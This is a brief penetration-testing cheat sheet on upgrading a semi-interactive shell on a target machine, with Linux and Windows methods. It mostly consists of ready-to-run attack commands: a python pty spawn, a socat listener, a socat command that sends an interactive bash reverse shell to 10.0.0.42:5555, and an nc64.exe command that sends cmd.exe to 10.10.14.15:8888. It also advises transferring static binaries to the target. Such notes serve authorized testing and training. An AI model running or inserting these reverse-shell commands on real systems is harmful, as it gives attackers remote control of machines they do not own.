# Shell Upgrading

Upgrade a semi-interactive shell to a fully interactive shell.

## Linux

### Method 1 - Using python3's pty module:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

You can also create a binary version of this short script using [PyInstaller](https://www.pyinstaller.org/). That way python will not need to be installed on the target machine, but you will have to create different binaries for different architectures.

### Method 2 - Create a new reverse shell with socat:

Listen for the shell on your own machine:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:5555,reuseaddr
```

Transfer the socat binary to the target and send a reverse shell to your machine (10.0.0.42):
```bash
chmod +x ./socat
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.42:5555
```

You can get a staticly linked binary here: https://github.com/andrew-d/static-binaries


## Windows

Download nc.exe or nc64.exe
```powershell
nc64.exe 10.10.14.15 8888 -e cmd.exe
```

A powershell reverse shell one-liner might also do the trick.
